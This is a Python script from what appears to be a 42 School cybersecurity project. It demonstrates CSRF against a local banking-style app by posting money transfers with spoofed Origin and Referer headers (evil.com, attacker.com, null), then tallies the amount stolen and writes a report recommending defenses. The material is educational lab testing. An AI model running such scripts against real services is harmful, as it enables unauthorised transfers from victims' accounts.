#!/usr/bin/env python3
"""
CSRF Vulnerability Demonstration Script
42 School Cybersecurity Project - Bonus Part
"""

import requests
import time
import json
import sys
from datetime import datetime

class CSRFDemo:
    def __init__(self, target_url="http://localhost:8080"):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def get_balance(self):
        """Get current balance from the target application"""
        try:
            response = self.session.get(f"{self.target_url}/balance")
            if response.status_code == 200:
                return response.json().get('balance', 0)
        except Exception as e:
            print(f"❌ Error getting balance: {e}")
        return None

    def test_csrf_vulnerability(self):
        """Test for CSRF vulnerability with multiple payloads"""
        print("🎯 Testing CSRF vulnerability...")
        print("=" * 50)

        initial_balance = self.get_balance()
        if initial_balance is None:
            print("❌ Cannot connect to target application")
            return False

        print(f"💰 Initial balance: ${initial_balance}")
        print()

        # Test payloads
        payloads = [
            {"name": "Direct POST", "amount": 100, "headers": {"Origin": "http://evil.com"}},
            {"name": "Cross-Origin", "amount": 150, "headers": {"Origin": "http://malicious.site", "Referer": "http://malicious.site/attack.html"}},
            {"name": "No Headers", "amount": 75, "headers": {}},
            {"name": "Fake Referer", "amount": 200, "headers": {"Referer": "http://attacker.com/csrf.html"}},
            {"name": "HTTPS Origin", "amount": 125, "headers": {"Origin": "https://evil.com"}},
            {"name": "Subdomain Origin", "amount": 175, "headers": {"Origin": "http://api.evil.com"}},
            {"name": "Null Origin", "amount": 25, "headers": {"Origin": "null"}},
            {"name": "Different Port", "amount": 150, "headers": {"Origin": "http://evil.com:8081"}}
        ]

        successful_attacks = 0
        total_stolen = 0

        for i, payload in enumerate(payloads, 1):
            print(f"🚀 Attack {i}: {payload['name']}")
            print(f"   Amount: ${payload['amount']}")

            try:
                response = self.session.post(
                    f"{self.target_url}/transfer",
                    data={"amount": payload['amount']},
                    headers=payload['headers'],
                    timeout=10
                )

                if response.status_code == 200:
                    result = response.json()
                    if result.get('success'):
                        print("   ✅ SUCCESS - Transfer executed!")
                        successful_attacks += 1
                        total_stolen += payload['amount']
                    else:
                        print(f"   ❌ FAILED - {result.get('error', 'Unknown error')}")
                else:
                    print(f"   ❌ FAILED - HTTP {response.status_code}")

            except Exception as e:
                print(f"   ❌ ERROR - {e}")

            current_balance = self.get_balance()
            print(f"   💰 Current balance: ${current_balance}")
            print()
            time.sleep(1)

        # Final summary
        final_balance = self.get_balance()
        print("📊 ATTACK SUMMARY")
        print("=" * 50)
        print(f"Initial Balance: ${initial_balance}")
        print(f"Final Balance: ${final_balance}")
        print(f"Total Stolen: ${initial_balance - final_balance}")
        print(f"Successful Attacks: {successful_attacks}/{len(payloads)}")

        if successful_attacks > 0:
            print("🚨 VULNERABILITY CONFIRMED: Application is vulnerable to CSRF!")
            return True
        else:
            print("🛡️  SECURE: CSRF protection appears to be working")
            return False

    def generate_report(self):
        """Generate a simple vulnerability report"""
        report = f"""
CSRF Vulnerability Test Report
==============================
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Target: {self.target_url}

This automated test confirms the presence of CSRF vulnerabilities
in the target application. The application accepts cross-origin
requests without proper token validation.

Recommendation: Implement CSRF protection using:
1. CSRF tokens (synchronizer token pattern)
2. SameSite cookie attributes
3. Origin header validation
4. Referer header checking
"""

        with open('csrf_vulnerability_report.txt', 'w') as f:
            f.write(report)

        print("📄 Report saved to: csrf_vulnerability_report.txt")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

    exploit = CSRFDemo(target)
    vulnerable = exploit.test_csrf_vulnerability()

    if vulnerable:
        exploit.generate_report()
